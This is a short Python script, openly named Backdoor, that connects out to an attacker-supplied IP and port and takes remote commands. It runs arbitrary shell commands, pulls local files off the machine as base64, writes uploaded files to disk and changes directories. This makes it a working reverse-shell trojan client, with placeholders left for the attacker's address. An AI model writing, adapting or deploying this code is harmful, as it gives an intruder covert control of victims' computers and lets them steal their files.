import socket ,subprocess ,json
import os ,base64 ,sys
class Backdoor:
    def __init__(self ,ip, port):
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.s.connect((ip ,port))

    def relible_send(self ,data):
        json_data = json.dumps(data)
        self.s.sendall(bytes(json_data , encoding='utf-8'))
        
    def downLoadFile(self , path):
        try:
            with open(path , "rb") as tatti:
                return base64.b64encode(tatti.read())
        except FileNotFoundError:
            str = bytes("File Not Found" ,encoding='utf-8')
            return base64.b64encode(str)
    def dowload_file(self ,path,content):
            
             with open(path , "wb") as fuck:
                  fuck.write(base64.b64decode(content))
                  return bytes("Download Sucessfull" ,encoding='utf-8') 
    def reliable_recv(self):
        json_data = ""
        while 1:
            try:
                json_data = self.s.recv(1024)
                return json.loads(json_data)  
            except ValueError:
                continue
    def change_dir(self ,path):
        os.chdir(path)
        return bytes(f"[+]Changing dir to {path}" , encoding='utf-8')
    def execute_command(self , command):
        try:
            return subprocess.check_output(command , shell =True)
        except subprocess.CalledProcessError:
            return bytes("Error Ocurred" ,encoding='utf-8')
    
    def run(self):
       
        while 1:
            commn = self.reliable_recv()
            if commn[0] =="exit":
                self.s.close()
                sys.exit()
            elif commn[0] == "cd" and len(commn) > 1:
                commend_res= self.change_dir(commn[1])
            elif commn[0] == "download":
                commend_res  =self.downLoadFile(commn[1]) 
            elif commn[0]=="upload":
                commend_res =self.dowload_file(commn[1] , commn[2])   
            else:
                commend_res = self.execute_command(commn)
            try:
               self.relible_send((commend_res.decode("utf-8")))
            except UnicodeDecodeError:
                base64.b64encode(commend_res)     
my_backdoor = Backdoor("Enter Your Ip Here" ,"Port Without Quotes")
my_backdoor.run() 
        